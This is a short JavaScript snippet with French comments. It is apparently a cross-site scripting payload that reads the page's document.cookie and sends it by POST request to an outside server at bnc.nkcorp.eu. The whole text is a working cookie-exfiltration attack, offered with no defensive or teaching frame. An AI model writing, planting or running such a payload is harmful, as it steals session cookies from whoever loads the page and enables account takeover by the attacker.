(function() {
    var cookie = document.cookie;
    var xhr = new XMLHttpRequest();
    var yourServerURL = "https://bnc.nkcorp.eu/";

    // Préparez les données à envoyer
    var data = "cookie=" + encodeURIComponent(cookie);

    // Configurez la requête
    xhr.open("POST", yourServerURL, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    // Envoyez la requête avec les données
    xhr.send(data);
})();
